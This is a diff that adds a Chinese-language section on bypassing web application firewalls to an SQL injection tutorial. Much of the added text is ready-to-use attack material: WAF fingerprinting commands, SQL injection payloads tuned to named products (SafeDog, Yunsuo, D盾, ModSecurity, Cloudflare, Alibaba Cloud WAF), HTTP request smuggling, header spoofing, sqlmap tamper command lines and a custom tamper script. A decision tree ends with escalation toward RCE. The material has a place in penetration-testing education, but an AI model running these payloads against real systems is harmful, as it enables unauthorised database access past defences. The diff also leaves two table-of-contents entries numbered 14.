@@ -27,17 +27,26 @@
     - 8.15 [综合绕过策略](#0x1015-综合绕过策略)
     - 8.16 [绕过技术总结对比表](#0x1016-绕过技术总结对比表)
     - 8.17 [绕过手法速查口诀](#0x1017-绕过手法速查口诀)
-9. [二次注入](#二次注入)
-10. [不同数据库的注入差异](#不同数据库的注入差异)
-11. [INSERT/UPDATE/DELETE 注入（非查询语句注入）](#insertupdatedelete-注入非查询语句注入)
-    - 11.1 [INSERT 注入](#0x18-insert-注入)
-    - 11.2 [UPDATE 注入](#0x19-update-注入)
-    - 11.3 [DELETE 注入](#0x20-delete-注入)
-    - 11.4 [ORDER BY / GROUP BY 注入](#0x21-order-by--group-by-注入)
-    - 11.5 [LIMIT 注入](#0x22-limit-注入)
-    - 11.6 [非查询注入总结](#0x23-非查询注入总结)
-12. [SQL 注入防御](#sql-注入防御)
-13. [实战练习资源](#实战练习资源)
+9. [WAF 绕过专题](#0x11-waf-绕过专题)
+    - 9.1 [WAF 分类与工作原理](#0x111-waf-分类与工作原理)
+    - 9.2 [WAF 指纹识别](#0x112-waf-指纹识别)
+    - 9.3 [常见 WAF 产品及针对性绕过](#0x113-常见-waf-产品及针对性绕过)
+    - 9.4 [WAF 绕过方法论](#0x114-waf-绕过方法论系统化流程)
+    - 9.5 [高级 WAF 绕过技术](#0x115-高级-waf-绕过技术)
+    - 9.6 [自动化绕过工具与 Tamper 脚本](#0x116-自动化绕过工具与-tamper-脚本)
+    - 9.7 [WAF 绕过实战决策树](#0x117-waf-绕过实战决策树)
+    - 9.8 [WAF 绕过核心原则总结](#0x118-waf-绕过核心原则总结)
+10. [二次注入](#二次注入)
+11. [不同数据库的注入差异](#不同数据库的注入差异)
+12. [INSERT/UPDATE/DELETE 注入（非查询语句注入）](#insertupdatedelete-注入非查询语句注入)
+    - 12.1 [INSERT 注入](#0x18-insert-注入)
+    - 12.2 [UPDATE 注入](#0x19-update-注入)
+    - 12.3 [DELETE 注入](#0x20-delete-注入)
+    - 12.4 [ORDER BY / GROUP BY 注入](#0x21-order-by--group-by-注入)
+    - 12.5 [LIMIT 注入](#0x22-limit-注入)
+    - 12.6 [非查询注入总结](#0x23-非查询注入总结)
+13. [SQL 注入防御](#sql-注入防御)
+14. [实战练习资源](#实战练习资源)
 14. [DNSLog 带外注入](#0x11-dnslog-带外注入out-of-band)
 
 ---
@@ -1507,6 +1516,520 @@ OR 被拦截用 ||，AND 被拦截用 &&
 内联注释 /*!*/，版本控制过 WAF
 带外注入终极招，DNSLog 把数据扛
 
+---
+
+### 0x11 WAF 绕过专题
+
+前面的 0x10 章节介绍了 SQL 语法层面的绕过技巧。本节从 **WAF（Web 应用防火墙）本身** 的视角出发，系统化讲解 WAF 的识别、分类、常见产品特性以及针对性绕过方法。
+
+---
+
+#### 0x11.1 WAF 分类与工作原理
+
+按照部署位置和实现方式，WAF 主要分为以下几类：
+
+| 类型 | 代表产品 | 特点 | 绕过难度 |
+|------|---------|------|---------|
+| **云 WAF** | Cloudflare、阿里云WAF、腾讯云WAF、AWS WAF | 通过 DNS 解析引流，流量经过云端清洗 | 较高（规则库常更新） |
+| **软件 WAF** | ModSecurity、安全狗、D盾、云锁 | 安装在服务器上，与 Web 服务同机部署 | 中等（可本地测试） |
+| **硬件 WAF** | F5 Big-IP、Imperva、绿盟 | 串联在网络中，独立硬件设备 | 高（处理能力强） |
+| **主机 WAF** | 各类 Web 服务器模块（如 ngx_waf） | 以模块形式集成在 Nginx/Apache 中 | 中低（受限于资源） |
+| **框架级 WAF** | 代码层面的过滤函数（如各种 CMS 自带的 filter） | 在应用代码中实现 | 低~中（常存在逻辑缺陷） |
+
+##### WAF 常见检测机制
+
+```text
+1. 规则匹配 —— 基于正则表达式检测已知攻击签名
+   局限性：正则存在遗漏/误报，可通过变形绕过
+
+2. 语义分析 —— 解析 SQL/AST 语法树，判断语句结构
+   局限性：处理复杂混淆时性能开销大，可被嵌套拆解绕过（如嵌套括号）
+
+3. 频率限制 —— 检测单位时间内的请求量
+   局限性：可通过慢速注入、代理轮换来绕过
+
+4. 行为分析/机器学习 —— 学习正常流量基线，识别异常
+   局限性：需要训练数据，冷启动阶段不准确；对抗性样本可绕过
+```
+
+---
+
+#### 0x11.2 WAF 指纹识别
+
+渗透的第一步是确定目标的 WAF 类型，下面列出常见的识别方法：
+
+##### 方法 1：响应头识别
+
+```http
+# 安全狗
+Server: Apache/2.x.x
+X-Powered-By: WAF/2.0       -- 部分版本存在
+
+# Cloudflare
+Server: cloudflare
+CF-RAY: 123456abc            -- 每次请求返回唯一 ray ID
+
+# 阿里云 WAF
+Server: Tengine/Aserver       -- 阿里云 WAF
+
+# ModSecurity
+X- Mod-Security: 1.0         -- 可见时
+```
+
+##### 方法 2：特殊路径探测
+
+访问不存在的路径或触发特定错误，观察 WAF 的拦截页面特征：
+
+```bash
+# 发送恶意请求观察拦截页面样式、文案、状态码
+curl -k "http://target.com/?id=1%20AND%201=1"
+# 被拦截 -> 观察返回内容中的 WAF 特征字符串
+# 未拦截 -> 可能没有 WAF 或规则未触发
+```
+
+##### 方法 3：使用 wafw00f 工具
+
+```bash
+# 安装
+pip install wafw00f
+
+# 识别 WAF 类型
+wafw00f http://target.com
+
+# 详细模式
+wafw00f http://target.com -a
+```
+
+##### 常见 WAF 拦截特征速查
+
+| WAF 产品 | 返回状态码 | 拦截页面关键词 |
+|----------|-----------|--------------|
+| **安全狗** | 200（页面内容替换） | `安全狗`、`safedog` |
+| **D盾** | 200 | `D盾`、`dunweb` |
+| **云锁** | 200 | `云锁`、`yunsuo` |
+| **Cloudflare** | 403 | `Attention Required`、`Cloudflare` |
+| **阿里云 WAF** | 405/406 | `blocked by ALIBABA`、waf.aliyun.com |
+| **ModSecurity** | 406/501 | `ModSecurity`、`Not Acceptable` |
+| **AWS WAF** | 403 | `Request blocked`、`AWS WAF` |
+| **360 主机卫士** | 200 | `360`、`主机卫士` |
+
+---
+
+#### 0x11.3 常见 WAF 产品及针对性绕过
+
+> **注意**：以下绕过方法基于特定历史版本，新版 WAF 可能已修复。实际测试时需结合 0x10 章节的通用绕过技巧，灵活组合。
+
+---
+
+##### 安全狗（SafeDog）
+
+安全狗是国内使用率较高的服务器安全软件，具有 SQL 注入、XSS、文件上传等多种防护。
+
+```sql
+-- 绕过思路 1：内联注释 + 编码混合
+id=-1/*!UNION*/%23%0a/*!SELECT*/1,2,3
+
+-- 绕过思路 2：利用 Content-Type 混淆
+-- 将 Content-Type 改为 multipart/form-data，参数放在非文件部分
+
+-- 绕过思路 3：利用换行符分割关键字
+id=-1%20UNION%0aSELECT%201,2,3
+
+-- 绕过思路 4：GET 转 POST + 参数污染
+-- 安全狗对 POST 的检测规则可能不如 GET 严格
+```
+
+---
+
+##### 云锁（Yunsuo）
+
+云锁的防护机制较为严格，对常见的 SQL 注入关键字和函数都有拦截。
+
+```sql
+-- 绕过思路 1：使用缓冲区溢出绕过
+-- 在 payload 前添加大量垃圾字符，使 WAF 检测超时或绕过
+id=1/*!99999lotsOfCharsHere...*/AND 1=1
+
+-- 绕过思路 2：分块传输绕过（需后端支持）
+-- 将 payload 拆成小块分开发送
+
+-- 绕过思路 3：使用 %00 截断（部分版本）
+id=1%00 UNION SELECT 1,2,3
+
+-- 绕过思路 4：嵌套括号绕过语义检测
+id=1 AND (SELECT (CASE WHEN (1=1) THEN SLEEP(3) ELSE 1=1 END))
+```
+
+---
+
+##### D盾（D盾_Webshell查杀 & 防护）
+
+D盾的 Web 防护模块对 SQL 注入和文件包含有较强的检测能力。
+
+```sql
+-- 绕过思路 1：参数类型混淆
+-- D盾对数字型参数检查较松
+id=1 INTO @a,@b;SELECT @a,@b
+
+-- 绕过思路 2：利用 HTTP 参数污染
+?id=1 UNION&id=SELECT 1,2,3&id=&id=--+
+-- WAF 取第一个参数，D盾可能检查第一个安全的后放行
+-- 后端 PHP 取最后一个参数，拼接后生效
+
+-- 绕过思路 3：使用 MySQL 用户变量做中间中转
+id=1 UNION SELECT @x:=1,@y:=2,@z:=3 FROM (SELECT @x:=0,@y:=0,@z:=0) a
+
+-- 绕过思路 4：URL 编码混合双编码
+id=1%252f*!UNION*/%252f*!SELECT*/1,2,3
+```
+
+---
+
+##### ModSecurity（OWASP CRS）
+
+ModSecurity 通常搭配 OWASP Core Rule Set，规则库全面但公开透明——知道规则就能有针对性地绕过。
+
+```sql
+-- 绕过思路 1：协议违规混淆
+-- 使用 HTTP/0.9（ModSecurity 可能跳过某些检查）
+
+-- 绕过思路 2：利用 CRS 规则匹配的偏移
+-- CRS 的 paranoia level 1~4，级别越低绕过越容易
+-- 可以在请求中注入正常参数分散检测注意力：
+id=1&foo=bar&baz=qux UNION SELECT 1,2,3
+
+-- 绕过思路 3：JSON/XML 格式提交
+Content-Type: application/json
+{"id": "1 UNION SELECT 1,2,3"}
+
+-- 绕过思路 4：利用 Unicode 等价分解
+-- ModSecurity 默认不进行 Unicode 等价分解
+id=1+UNION+SELECT+1,2,3    -- 某些规则对加号(+)代替空格的检查不严
+```
+
+---
+
+##### Cloudflare WAF
+
+Cloudflare 的 WAF 规则库更新频繁，且支持自定义规则。绕过难度整体较高。
+
+```sql
+-- 绕过思路 1：利用源站 IP 直连（绕过 CDN）
+-- 通过历史 DNS 记录、子域名枚举找到真实 IP
+curl -H "Host: target.com" http://REAL_IP/index.php?id=1 AND 1=1
+
+-- 绕过思路 2：利用 Cloudflare 的特定规则例外路径
+-- /cdn-cgi/ 路径下检查较松
+?id=1/*&id=*/ UNION SELECT 1,2,3
+
+-- 绕过思路 3：使用非标准 HTTP Method
+-- Cloudflare 对 OPTIONS/TRACE 检查较弱
+OPTIONS /index.php?id=1 UNION SELECT 1,2,3
+
+-- 绕过思路 4：利用开发环境绕过
+-- 如果 stg/tst 子域名没有经过 Cloudflare 或者 WAF 级别较低
+
+-- 绕过思路 5：使用 H2 升级绕过
+-- 利用 HTTP/2 的流量混淆
+```
+
+---
+
+##### 阿里云 WAF
+
+阿里云 WAF 是国内最大的云 WAF 之一，检测能力较强。
+
+```sql
+-- 绕过思路 1：参数污染（阿里云部分版本取第一个值，后端取最后一个）
+?id=1&id= UNION SELECT 1,2,3&id=1
+
+-- 绕过思路 2：利用白名单路径
+-- 管理员后台、API 接口的拦截级别通常较低
+/admin/index.php?id=1 UNION SELECT 1,2,3
+
+-- 绕过思路 3：Content-Type 切换
+-- 从 form-urlencoded 改为 multipart/form-data
+
+-- 绕过思路 4：利用条件竞争（Race Condition）
+-- 在 WAF 规则更新间隙发送 payload
+-- 配合大量正常请求稀释恶意请求的审查密度
+```
+
+---
+
+#### 0x11.4 WAF 绕过方法论：系统化流程
+
+遇到 WAF 拦截时，按照以下流程可以系统地找到绕过路径：
+
+```text
+Step 1: 识别 WAF 类型
+|-- 使用 wafw00f / 手动识别
+L-- 确定 WAF 产品、版本、部署方式（云/软件/硬件）
+
+Step 2: 探测规则边界
+|-- 逐个测试关键字：AND、OR、UNION、SELECT、空格、引号、逗号
+|-- 记录每个关键字的拦截情况（哪个关键字触发了拦截）
+|-- 测试 payload 长度限制（短 payload 可能不触发）
+L-- 测试请求方法的差异（GET vs POST vs COOKIE vs HEADER）
+
+Step 3: 选择绕过策略
+|-- 如果 WAF 基于正则（大多数）-> 优先尝试编码混淆、注释插入
+|-- 如果 WAF 基于语义分析 -> 优先尝试嵌套、拆解、变量中转
+|-- 如果 WAF 有协议解析缺陷 -> 优先尝试 HPP、Content-Type 混淆
+L-- 如果 WAF 频率限制严格 -> 优先尝试慢速注入、IP 轮换
+
+Step 4: 组合绕过技术
+|-- 从最简单的方法开始（大小写 -> 双写 -> 编码 -> 注释）
+|-- 单一方法不行就组合（注释 + 编码 + 换行符）
+L-- 记录有效组合备用
+
+Step 5: 绕过验证
+|-- 确认注入点仍然有效
+|-- 确认没有触发新的拦截规则
+L-- 确认返回结果可正确处理
+```
+
+> **核心原则**：WAF 规则一定有短板，关键在于找到检测的盲区——可能是某个字符、某种编码、某个 Content-Type 或某个特定路径没有被覆盖。
+
+---
+
+#### 0x11.5 高级 WAF 绕过技术
+
+##### 1. 缓冲区溢出绕过
+
+向 WAF 发送超长 payload，使 WAF 的处理超时或检测逻辑崩溃：
+
+```sql
+-- 在 payload 前填充大量无意义字符
+id=1/*!9999999...(填充到约 8KB)...*/AND/**/1=1
+
+-- 使用大量嵌套括号
+id=1 AND ((((...((1=1))...)))
+
+-- 超大 payload + 核心注入
+id=1' AND 1=1-- -&padding=AAAA...(超长填充)
+```
+
+**原理**：WAF 通常有性能限制（最大分析字节数、嵌套深度），超出限制后可能直接放行。
+
+##### 2. HTTP 请求走私
+
+利用前端 WAF 和后端服务器对 HTTP 请求解析的差异，绕过 WAF 检测：
+
+```http
+POST /index.php HTTP/1.1
+Host: target.com
+Content-Length: 55
+Transfer-Encoding: chunked
+
+0
+
+GET /admin.php?id=1 UNION SELECT 1,2,3 HTTP/1.1
+Host: target.com
+```
+
+**原理**：WAF 和后端服务器对 Content-Length 与 Transfer-Encoding 的处理优先级不同，导致 WAF 认为请求已结束而放行，后端却继续解析后面的恶意数据。
+
+##### 3. JSON / XML 嵌套混淆
+
+```sql
+-- 将 payload 嵌套在 JSON 中发送（某些 WAF 不解析 JSON 内部）
+POST /api.php HTTP/1.1
+Content-Type: application/json
+
+{
+  "id": "1 UNION SELECT 1,2,3",
+  "params": {
+    "nested": "1' OR '1'='1"
+  }
+}
+
+-- 利用 XML 外部实体引用拆解 payload
+POST /xml.php HTTP/1.1
+Content-Type: application/xml
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY x "UNION">
+  <!ENTITY y "SELECT">
+]>
+<id>1 &x; &y; 1,2,3</id>
+```
+
+##### 4. 利用 WAF 白名单 / 信任列表
+
+```sql
+-- 使用内网 IP、localhost、特殊来源绕过云 WAF
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+
+-- 利用文件包含白名单路径
+-- 如果 WAF 对 admin 路径放行得较宽松
+/admin/db/manage.php?id=1 UNION SELECT 1,2,3
+```
+
+##### 5. 条件竞争绕过（Race Condition）
+
+```text
+核心思路：在 WAF 规则加载/更新的短暂间隙中发送恶意请求。
+
+适用场景：
+- 云 WAF 的规则分发存在延迟（秒级）
+- WAF 热加载配置时存在短暂的无防护窗口
+- WAF 与 CDN 之间存在缓存同步窗口
+
+实际可行性较低，但特定场景有效。
+```
+
+---
+
+#### 0x11.6 自动化绕过工具与 Tamper 脚本
+
+##### SQLMap + Tamper 脚本
+
+SQLMap 提供了大量 tamper 脚本，可以自动应用绕过技术：
+
+```bash
+# 查看所有 tamper 脚本列表
+sqlmap --list-tampers
+
+# 常用 tamper 组合（覆盖大部分 WAF 场景）
+# 针对安全狗
+sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between,unionalltounion
+
+# 针对 ModSecurity/通用 WAF
+sqlmap -u "http://target.com/?id=1" --tamper=charencode,charunicodeencode,nononunion
+
+# 针对 Cloudflare
+sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase,between
+
+# 针对阿里云 WAF
+sqlmap -u "http://target.com/?id=1" --tamper=bluecoat,versionedkeywords
+
+# 全自动绕过（随机组合所有 tamper）
+sqlmap -u "http://target.com/?id=1" --tamper="space2comment,between,randomcase,versionedkeywords,nononunion,unionalltounion,equaltolike,greatest"
+
+# 使用 --tamper 时推荐同时使用的参数
+sqlmap -u "http://target.com/?id=1" \
+  --tamper=space2comment,randomcase,between,equaltolike \
+  --random-agent \
+  --delay=2 \
+  --time-sec=5
+```
+
+##### 常用 Tamper 脚本详解
+
+| Tamper 名称 | 作用 | 适用场景 |
+|-------------|------|---------|
+| space2comment | 将空格替换为 `/**/` | 拦截空格的 WAF |
+| between | 将 `>` 替换为 `NOT BETWEEN`，`=` 替换为 `BETWEEN` | 拦截比较符的 WAF |
+| randomcase | 随机大小写 | 基于大小写匹配的 WAF |
+| unionalltounion | 将 `UNION ALL` 替换为 `UNION` | 检测 `UNION ALL` 的 WAF |
+| equaltolike | 将 `=` 替换为 `LIKE` | 拦截等号的 WAF |
+| greatest | 将 `>` 替换为 `GREATEST` | 拦截比较符的 WAF |
+| charencode | 对字符进行 URL 编码 | 通用编码绕过 |
+| charunicodeencode | 对字符进行 Unicode 编码 | 部分 WAF/数据库 |
+| bluecoat | 在空格后面插入随机空字符 | Blue Coat / 安全狗 |
+| versionedkeywords | 使用 `/*!*/` 包裹关键字 | 基于关键字匹配的 WAF |
+| nononunion | 将 `UNION` 替换为 `UNION ALL` 等变体 | 有特定规则的 WAF |
+| percentage | 在每个字符前加 `%` | ASP/IIS 环境 |
+| apostrophemaskencode | 用 UTF-8 编码替换引号 | 拦截引号的 WAF |
+| multiplespaces | 在关键字周围添加多个空格 | 简单正则 WAF |
+
+##### 自定义 Tamper 脚本示例
+
+当现有 tamper 不满足需求时，可以编写自定义 tamper：
+
+```python
+#!/usr/bin/env python
+# Custom tamper: 空格替换为换行符(%0a) + 内联注释组合绕过
+# 针对同时拦截空格和关键字的安全狗/云锁
+from lib.core.enums import PRIORITY
+priority = PRIORITY.NORMAL
+
+def dependencies():
+    pass
+
+def tamper(payload, **kwargs):
+    if payload:
+        payload = payload.replace(" ", "%0a")
+        for keyword in ["UNION", "SELECT", "WHERE", "AND", "OR"]:
+            payload = payload.replace(keyword, "/*!" + keyword + "*/")
+    return payload
+```
+
+##### 其他自动化工具
+
+```bash
+# wafw00f -- WAF 指纹识别（上文已介绍）
+
+# WhatWAF -- 另一个 WAF 识别工具
+git clone https://github.com/Ekultek/WhatWAF.git
+
+# bypass_waf -- 自动化 WAF 测试框架（需 Python3）
+git clone https://github.com/hvqzao/bypass_waf.git
+
+# 手工辅助：使用 Burp Suite + 自定义规则
+# - Intruder：逐个关键字探测 WAF 拦截边界
+# - Repeater：手动测试不同绕过组合
+# - Turbo Intruder：高速重放测试（配合 race condition）
+```
+
+---
+
+#### 0x11.7 WAF 绕过实战决策树
+
+```
+                    +-- 第一步：识别 WAF 类型
+                    |     |-- 云 WAF (Cloudflare/阿里云/腾讯云)
+                    |     |   L-- 尝试找真实 IP 直连
+                    |     |-- 软件 WAF (安全狗/D盾/云锁)
+                    |     |   L-- 针对版本寻找已知绕过
+                    |     L-- ModSecurity
+                    |         L-- 根据 CRS 版本和 paranoia 级别
+                    |
+                    +-- 第二步：探测过滤边界
+                    |     |-- 测试 AND/OR  ->  被拦？用 &&/||
+                    |     |-- 测试 UNION   ->  被拦？用内联注释
+                    |     |-- 测试 SELECT  ->  被拦？用双写/编码
+                    |     |-- 测试 空格    ->  被拦？用注释/括号
+                    |     L-- 测试 单引号  ->  被拦？用十六进制
+                    |
+                    +-- 第三步：单层绕过
+                    |     |-- 成功 -> 直接进行注入
+                    |     L-- 失败 -> 进入组合绕过
+                    |
+ 遇到 WAF 拦截 ---->+-- 第四步：组合绕过
+                    |     |-- 单关键字绕过不够 -> 组合多种技巧
+                    |     |-- 语法层绕过不够 -> 切换到协议层
+                    |     |   L-- HPP / 分块传输 / CT 混淆
+                    |     L-- 协议层绕过不够 -> 切换到应用层
+                    |         L-- 缓冲区溢出 / 走私 / 白名单
+                    |
+                    +-- 第五步：更换注入方式
+                    |     |-- UNION 注入被拦 -> 报错注入
+                    |     |-- 报错注入被拦 -> 布尔盲注
+                    |     |-- 布尔盲注被拦 -> 时间盲注
+                    |     L-- 时间盲注太慢 -> OOB 带外注入
+                    |
+                    L-- 如果以上全部无效
+                          L-- 考虑非 SQL 注入的攻击路径
+                               L-- CSRF / SSRF / 文件上传 / RCE
+```
+
+---
+
+#### 0x11.8 WAF 绕过核心原则总结
+
+1. **WAF 不等于绝对防御**：任何 WAF 都有规则盲区，关键在于找到 WAF 和后端服务器之间的"解析差异"
+2. **越简单越可靠**：能用大小写绕过就不要用多层编码，减少干扰因素
+3. **组合拳效果更佳**：单种绕过被拦时，将 2~3 种技巧组合使用往往能突破
+4. **更换攻击面**：当注入点被严密防守时，尝试在其他位置（Cookie、Header、User-Agent）进行注入
+5. **关注协议层而非只是 Payload 层**：很多突破点在 HTTP 协议层面（编码、分块、方法转换）而非 SQL 语句本身
+6. **本地搭建测试环境**：针对特定 WAF 产品，本地搭建相同版本测试能显著提高绕过效率
+7. **规则库是静态的，攻击面是动态的**：WAF 规则更新永远滞后于新攻击手法，持续关注安全社区的新发现
+8. **自动化与手工结合**：SQLMap 做大批量测试，Burp Suite 做手工精调，两者互补
 
 ---
 
